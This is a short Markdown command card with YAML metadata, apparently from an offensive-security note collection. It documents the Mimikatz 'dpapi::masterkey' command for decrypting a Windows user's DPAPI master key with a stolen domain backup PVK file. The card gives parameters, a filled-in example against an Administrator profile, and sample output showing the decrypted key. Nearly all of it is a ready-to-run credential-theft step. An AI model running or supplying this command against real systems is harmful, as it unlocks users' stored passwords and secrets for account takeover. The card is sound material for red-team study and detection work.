---
type: command
executor: cmd
data: >-
  mimikatz.exe "dpapi::masterkey
  /in:\"C:\Users\$_USERNAME\AppData\Roaming\Microsoft\Protect\$_USER_SID\$_MASTERKEY_GUID\"
  /pvk:$_PVK_FILE"
platforms:
  - Windows
tags:
  - decryption
  - dpapi
  - mimikatz
verified: true
validated: true
---

# mimikatz-dpapi-masterkey-decrypt-with-pvk

## Command

```cmd
mimikatz.exe "dpapi::masterkey /in:\"C:\Users\$_USERNAME\AppData\Roaming\Microsoft\Protect\$_USER_SID\$_MASTERKEY_GUID\" /pvk:$_PVK_FILE"
```

## Description

Decrypts a user's DPAPI master key using a backup private key (PVK) file in Mimikatz.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_USERNAME | Target username | Yes |
| $_USER_SID | User's Security Identifier (e.g., S-1-5-21-2552734371-813931464-1050690807-1106) | Yes |
| $_MASTERKEY_GUID | GUID of the master key file (e.g., 3e90dd9e-f901-40a1-b691-84d7f647b8fe) | Yes |
| $_PVK_FILE | Path to exported PVK file (e.g., ntds_capi_0_d2685b31-402d-493b-8d12-5fe48ee26f5a.pvk) | Yes |
| /in: | Input path to master key | Yes |
| /pvk: | Private key file for decryption | Yes |

## Examples

### Basic Usage

```cmd
mimikatz.exe "dpapi::masterkey /in:\"C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe\" /pvk:ntds_capi_0_d2685b31-402d-493b-8d12-5fe48ee26f5a.pvk"
```

## Expected Output

```
MasterKey file 'C:\...\3e90dd9e-f901-40a1-b691-84d7f647b8fe' open
* Master Key decrypt ok !
SHA1     : 95664450 d90eb2ce 9a8b1933 f823b905 ...
MasterKey: 95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b
```

## Related

- [[procedures/Windows-DPAPI-Credential-Retrieval-with-Mimikatz]]
